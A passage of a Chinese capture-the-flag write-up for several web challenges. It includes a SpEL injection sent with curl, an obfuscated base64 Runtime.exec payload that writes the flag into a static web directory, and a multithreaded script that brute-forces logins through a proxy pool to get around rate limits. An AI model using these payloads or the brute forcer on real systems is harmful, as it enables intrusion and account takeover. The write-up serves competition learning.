</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>}</span><span class=w> </span><span class=k>catch</span><span class=w> </span><span class=p>(</span><span class=n>IOException</span><span class=w> </span><span class=n>e</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>throw</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>RuntimeException</span><span class=p>(</span><span class=n>e</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=n>result</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>找到路由，只要我能把 user.home 设置为<code>/tmp</code>即可读取，SpEL表达式注入</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>curl</span> <span class=o>-</span><span class=n>s</span> <span class=o>-</span><span class=n>k</span> <span class=o>-</span><span class=n>G</span> <span class=s2>&#34;https://eci-2zea7hvcu2974q96yu5q.cloudeci1.ichunqiu.com:8080/check&#34;</span> <span class=o>--</span><span class=n>data</span><span class=o>-</span><span class=n>urlencode</span> <span class=s2>&#34;rule=#{#systemProperties[&#39;user.home&#39;]}&#34;</span><span class=o>.</span><span class=n>home</span><span class=s1>&#39;]}&#34;</span>
</span></span><span class=line><span class=cl><span class=n>Result</span><span class=p>:</span> <span class=o>/</span><span class=n>root</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>curl</span> <span class=o>-</span><span class=n>s</span> <span class=o>-</span><span class=n>k</span> <span class=o>-</span><span class=n>G</span> <span class=s2>&#34;https://eci-2zea7hvcu2974q96yu5q.cloudeci1.ichunqiu.com:8080/check&#34;</span> <span class=o>--</span><span class=n>data</span><span class=o>-</span><span class=n>urlencode</span> <span class=s2>&#34;rule=#{#systemProperties[&#39;user.home&#39;]=&#39;/tmp&#39;}&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>Result</span><span class=p>:</span> <span class=o>/</span><span class=n>rootroot</span><span class=nd>@jpzuPcurl</span> <span class=o>-</span><span class=n>s</span> <span class=o>-</span><span class=n>k</span> <span class=o>-</span><span class=n>G</span> <span class=s2>&#34;https://eci-2zea7hvcu2974q96yu5q.cloudeci1.ichunqiu.com:8080/check&#34;</span> <span class=o>--</span><span class=n>data</span><span class=o>-</span><span class=n>urlencode</span> <span class=s2>&#34;rule=#{#systemProperties[&#39;user.home&#39;]=&#39;/tmp&#39;}&#34;</span><span class=n>me</span><span class=s1>&#39;]=&#39;</span><span class=o>/</span><span class=n>tmp</span><span class=s1>&#39;}&#34;</span>
</span></span><span class=line><span class=cl><span class=n>Result</span><span class=p>:</span> <span class=o>/</span><span class=n>tmp</span><span class=o>&lt;</span><span class=n>br</span><span class=o>&gt;&lt;</span><span class=n>b</span><span class=o>&gt;</span><span class=err>🚩</span> <span class=n>Flag</span><span class=p>:</span><span class=o>&lt;/</span><span class=n>b</span><span class=o>&gt;</span> <span class=n>flag</span><span class=p>{</span><span class=n>d7389950</span><span class=o>-</span><span class=mi>71</span><span class=n>f8</span><span class=o>-</span><span class=mi>4898</span><span class=o>-</span><span class=n>a0b3</span><span class=o>-</span><span class=mf>9108e5</span><span class=n>bddf30</span><span class=p>}</span><span class=n>root</span><span class=nd>@jpzuP3ZFPNnal4</span><span class=p>:</span><span class=o>~</span><span class=c1># </span>
</span></span></code></pre></td></tr></table></div></div><p>本来打算直接设置为<code>/tmp</code>，在读取的，但是直接返回了</p><h2 id=yamcs>Yamcs</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>FROM maven:3.9.9-eclipse-temurin-17
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>WORKDIR /build
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>RUN apt-get update &amp;&amp; apt-get install -y git &amp;&amp; \
</span></span><span class=line><span class=cl>    git clone https://github.com/yamcs/quickstart.git
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>WORKDIR /build/quickstart
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>RUN chmod +x mvnw
</span></span><span class=line><span class=cl>RUN ./mvnw compile
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>RUN apt-get update &amp;&amp; \
</span></span><span class=line><span class=cl>    apt-get install -y python3 python3-pip &amp;&amp; \
</span></span><span class=line><span class=cl>    apt-get clean
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>RUN ./mvnw dependency:go-offline
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>RUN echo FLAG&gt;/flag
</span></span><span class=line><span class=cl>EXPOSE 8090
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>CMD bash -c &#39;\
</span></span><span class=line><span class=cl>  nohup python3 simulator.py &gt;/dev/null 2&gt;&amp;1 &amp; \
</span></span><span class=line><span class=cl>  ./mvnw yamcs:run&#39;
</span></span></code></pre></td></tr></table></div></div><p>直接本地 clone 项目，很小，发现</p><p><img src=/p/qwb-2025/8.png width=2228 height=1366 loading=lazy alt=img></p><p>发现可控字符串，clone 完整的后端大项目下来搜索这个方法的实现，结果全局搜索搜不出来，从数据流路由找出 web 路由，</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>/algorithms/[InstanceName]/[AlgorithmName]/-/summary?c=[InstanceName]__[ProcessorName]
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>/algorithms/myproject/copySunsensor/-/summary?c=myproject__realtime
</span></span></code></pre></td></tr></table></div></div><p><img src=/p/qwb-2025/9.png width=2119 height=1345 loading=lazy alt=img></p><p>找到能够 RCE 的地方，但是远程不出网，jdk17 内存马写不来</p><p><img src=/p/qwb-2025/10.png width=2497 height=1264 loading=lazy alt=img></p><p>起个 docker 找到静态目录</p><p><img src=/p/qwb-2025/11.png width=1462 height=473 loading=lazy alt=img></p><p>直接写入</p><p><img src=/p/qwb-2025/12.png width=1944 height=1078 loading=lazy alt=img></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=k>try</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>Runtime</span><span class=p>.</span><span class=na>getRuntime</span><span class=p>().</span><span class=na>exec</span><span class=p>(</span><span class=s>&#34;bash -c {echo,dGFjIC9mbGFnID4gL2J1aWxkL3F1aWNrc3RhcnQvdGFyZ2V0L3lhbWNzL2NhY2hlL3lhbWNzLXdlYi8xLnR4dA==}|{base64,-d}|{bash,-i}&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w> </span><span class=k>catch</span><span class=w> </span><span class=p>(</span><span class=n>java</span><span class=p>.</span><span class=na>io</span><span class=p>.</span><span class=na>IOException</span><span class=w> </span><span class=n>e</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>throw</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>RuntimeException</span><span class=p>(</span><span class=n>e</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><h2 id=anime>anime</h2><p>在网上可以找到是原题，但是我没有池子，所以也是队友来解决的。</p><p>每ip每秒限制5次登陆访问，题目提示5位数字的密码，可以上ip池爆破</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>concurrent.futures</span> <span class=kn>import</span> <span class=n>ThreadPoolExecutor</span><span class=p>,</span> <span class=n>as_completed</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>tqdm</span> <span class=kn>import</span> <span class=n>tqdm</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s1>&#39;p.txt&#39;</span><span class=p>,</span> <span class=s1>&#39;r&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>psa</span> <span class=o>=</span> <span class=p>[</span><span class=n>x</span><span class=o>.</span><span class=n>strip</span><span class=p>()</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39;:&#39;</span><span class=p>)</span> <span class=k>for</span> <span class=n>x</span> <span class=ow>in</span> <span class=n>f</span><span class=o>.</span><span class=n>readlines</span><span class=p>()]</span>
</span></span><span class=line><span class=cl><span class=c1># print(psa)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>target_url</span> <span class=o>=</span> <span class=s2>&#34;http://47.105.120.74:1001/login&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>filter_disabled_ips</span><span class=p>(</span><span class=n>psa</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>result</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>ps</span> <span class=ow>in</span> <span class=n>tqdm</span><span class=p>(</span><span class=n>psa</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>proxyMeta</span> <span class=o>=</span> <span class=s2>&#34;http://</span><span class=si>%(host)s</span><span class=s2>:</span><span class=si>%(port)s</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;host&#34;</span><span class=p>:</span> <span class=n>ps</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;port&#34;</span><span class=p>:</span> <span class=n>ps</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=n>proxies</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;http&#34;</span><span class=p>:</span> <span class=n>proxyMeta</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;https&#34;</span><span class=p>:</span> <span class=n>proxyMeta</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=n>res</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>target_url</span><span class=p>,</span> <span class=n>proxies</span><span class=o>=</span><span class=n>proxies</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>res</span><span class=o>.</span><span class=n>status_code</span> <span class=ow>in</span> <span class=p>[</span><span class=mi>302</span><span class=p>,</span> <span class=mi>200</span><span class=p>]:</span>
</span></span><span class=line><span class=cl>            <span class=n>result</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>ps</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=n>ps</span><span class=p>,</span> <span class=n>res</span><span class=o>.</span><span class=n>status_code</span><span class=p>,</span> <span class=n>res</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>result</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># psa = filter_disabled_ips(psa)</span>
</span></span><span class=line><span class=cl><span class=c1># print(len(psa))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>login</span><span class=p>(</span><span class=n>password</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>username</span> <span class=o>=</span> <span class=s2>&#34;TTXSMcc&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>ps</span> <span class=o>=</span> <span class=n>psa</span><span class=p>[</span><span class=nb>int</span><span class=p>(</span><span class=n>password</span><span class=p>)</span> <span class=o>%</span> <span class=nb>len</span><span class=p>(</span><span class=n>psa</span><span class=p>)]</span>
</span></span><span class=line><span class=cl>    <span class=n>proxyMeta</span> <span class=o>=</span> <span class=s2>&#34;http://</span><span class=si>%(host)s</span><span class=s2>:</span><span class=si>%(port)s</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;host&#34;</span><span class=p>:</span> <span class=n>ps</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;port&#34;</span><span class=p>:</span> <span class=n>ps</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=n>proxies</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;http&#34;</span><span class=p>:</span> <span class=n>proxyMeta</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;https&#34;</span><span class=p>:</span> <span class=n>proxyMeta</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=n>data</span> <span class=o>=</span> <span class=p>{</span><span class=s2>&#34;username&#34;</span><span class=p>:</span> <span class=n>username</span><span class=p>,</span> <span class=s2>&#34;password&#34;</span><span class=p>:</span> <span class=n>password</span><span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=n>res</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>target_url</span><span class=p>,</span> <span class=n>data</span><span class=o>=</span><span class=n>data</span><span class=p>,</span> <span class=n>proxies</span><span class=o>=</span><span class=n>proxies</span><span class=p>,</span> <span class=n>allow_redirects</span><span class=o>=</span><span class=kc>False</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>res</span><span class=o>.</span><span class=n>status_code</span> <span class=o>!=</span> <span class=mi>302</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s1>&#39;failed.txt&#39;</span><span class=p>,</span> <span class=s1>&#39;a&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>f</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>password</span><span class=si>}</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=c1># print(password, res.status_code, res.text)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=s2>&#34;/login&#34;</span> <span class=ow>in</span> <span class=n>res</span><span class=o>.</span><span class=n>text</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>pass</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>password</span><span class=p>,</span> <span class=n>res</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>run</span><span class=p>(</span><span class=n>tasks</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>with</span> <span class=n>ThreadPoolExecutor</span><span class=p>(</span><span class=n>max_workers</span><span class=o>=</span><span class=mi>20</span><span class=p>)</span> <span class=k>as</span> <span class=n>executor</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>futures</span> <span class=o>=</span> <span class=p>[</span><span class=n>executor</span><span class=o>.</span><span class=n>submit</span><span class=p>(</span><span class=n>login</span><span class=p>,</span> <span class=n>pas</span><span class=p>)</span> <span class=k>for</span> <span class=n>pas</span> <span class=ow>in</span> <span class=n>tasks</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>_</span> <span class=ow>in</span> <span class=n>tqdm</span><span class=p>(</span><span class=n>as_completed</span><span class=p>(</span><span class=n>futures</span><span class=p>),</span> <span class=n>total</span><span class=o>=</span><span class=nb>len</span><span class=p>(</span><span class=n>futures</span><span class=p>)):</span>
</span></span><span class=line><span class=cl>            <span class=k>pass</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s1>&#39;__main__&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>tasks</span> <span class=o>=</span> <span class=p>[</span><span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>i</span><span class=si>:</span><span class=s2>05d</span><span class=si>}</span><span class=s2>&#34;</span> <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>100000</span><span class=p>)]</span>
</span></span><span class=line><span class=cl>    <span class=c1># tasks = [x.strip() for x in open(&#39;failed.txt&#39;, &#39;r&#39;).readlines()]</span>
</span></span><span class=line><span class=cl>    <span class=c1># open(&#39;failed.txt&#39;, &#39;w&#39;).write(&#34;&#34;)</span>
</span></span><span class=line><span class=cl>    <span class=n>run</span><span class=p>(</span><span class=n>tasks</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>写wp的时候爆破出密码是18149（交flag的时候是89195）</p><p><img src=/p/qwb-2025/13.png width=1475 height=89 loading=lazy alt=img></p><p>登陆后编辑个人资料，没找到flag</p><p><img src=/p/qwb-2025/14.png width=1344 height=1010 loading=lazy alt=img></p><p>注册的时候发现用户名大小写不敏感，尝试将用户名改成全小写，拿到flag（可能是缓存机制的问题？）</p><p><img src=/p/qwb-2025/15.png width=1548 height=552 loading=lazy alt=img></p><h2 id=日志系统>日志系统</h2><p>如果读取不到 flag，可能是权限问题</p><p>api.php 代码如下，修改了部分代码，保证能够在本地运行</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nx>define</span><span class=p>(</span><span class=s1>&#39;DIR&#39;</span><span class=p>,</span> <span class=no>__DIR__</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl><span class=nv>$queryString</span> <span class=o>=</span> <span class=nv>$_SERVER</span><span class=p>[</span><span class=s1>&#39;QUERY_STRING&#39;</span><span class=p>]</span> <span class=o>??</span> <span class=s1>&#39;&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=k>empty</span><span class=p>(</span><span class=nv>$queryString</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>exit</span><span class=p>(</span><span class=s2>&#34;未检测到任何 GET 参数。&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nx>strpos</span><span class=p>(</span><span class=nv>$queryString</span><span class=p>,</span> <span class=s1>&#39;%&#39;</span><span class=p>)</span> <span class=o>!==</span> <span class=k>false</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>exit</span><span class=p>(</span><span class=s2>&#34;非法请求：GET 参数中不允许包含 &#39;%&#39; 字符。&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=nv>$params</span> <span class=o>=</span> <span class=nx>explode</span><span class=p>(</span><span class=s1>&#39;&amp;&#39;</span><span class=p>,</span> <span class=nv>$queryString</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$expectedOrder</span> <span class=o>=</span> <span class=p>[</span><span class=s1>&#39;timestamp[year]&#39;</span><span class=p>,</span> <span class=s1>&#39;timestamp[month]&#39;</span><span class=p>,</span> <span class=s1>&#39;timestamp[day]&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=nv>$foundKeys</span> <span class=o>=</span> <span class=p>[];</span>
</span></span><span class=line><span class=cl><span class=nv>$duplicates</span> <span class=o>=</span> <span class=p>[];</span>
</span></span><span class=line><span class=cl><span class=nv>$values</span> <span class=o>=</span> <span class=p>[];</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>foreach</span> <span class=p>(</span><span class=nv>$params</span> <span class=k>as</span> <span class=nv>$param</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nv>$parts</span> <span class=o>=</span> <span class=nx>explode</span><span class=p>(</span><span class=s1>&#39;=&#39;</span><span class=p>,</span> <span class=nv>$param</span><span class=p>,</span> <span class=mi>2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nv>$key</span> <span class=o>=</span> <span class=nx>urldecode</span><span class=p>(</span><span class=nv>$parts</span><span class=p>[</span><span class=mi>0</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>    <span class=nv>$value</span> <span class=o>=</span> <span class=nx>isset</span><span class=p>(</span><span class=nv>$parts</span><span class=p>[</span><span class=mi>1</span><span class=p>])</span> <span class=o>?</span> <span class=nx>urldecode</span><span class=p>(</span><span class=nv>$parts</span><span class=p>[</span><span class=mi>1</span><span class=p>])</span> <span class=o>:</span> <span class=s1>&#39;&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nx>preg_match</span><span class=p>(</span><span class=s1>&#39;/^timestamp[[a-zA-Z]+]$/&#39;</span><span class=p>,</span> <span class=nv>$key</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nx>in_array</span><span class=p>(</span><span class=nv>$key</span><span class=p>,</span> <span class=nv>$foundKeys</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nv>$duplicates</span><span class=p>[]</span> <span class=o>=</span> <span class=nv>$key</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nv>$foundKeys</span><span class=p>[]</span> <span class=o>=</span> <span class=nv>$key</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=nv>$values</span><span class=p>[</span><span class=nv>$key</span><span class=p>]</span> <span class=o>=</span> <span class=nv>$value</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$missing</span> <span class=o>=</span> <span class=nx>array_diff</span><span class=p>(</span><span class=nv>$expectedOrder</span><span class=p>,</span> <span class=nv>$foundKeys</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$extra</span>   <span class=o>=</span> <span class=nx>array_diff</span><span class=p>(</span><span class=nv>$foundKeys</span><span class=p>,</span> <span class=nv>$expectedOrder</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=k>empty</span><span class=p>(</span><span class=nv>$duplicates</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>exit</span><span class=p>(</span><span class=s2>&#34;检测到重复的参数：&#34;</span> <span class=o>.</span> <span class=nx>implode</span><span class=p>(</span><span class=s1>&#39;, &#39;</span><span class=p>,</span> <span class=nx>array_unique</span><span class=p>(</span><span class=nv>$duplicates</span><span class=p>)));</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=k>empty</span><span class=p>(</span><span class=nv>$missing</span><span class=p>))</span> <span class=p>{</span>
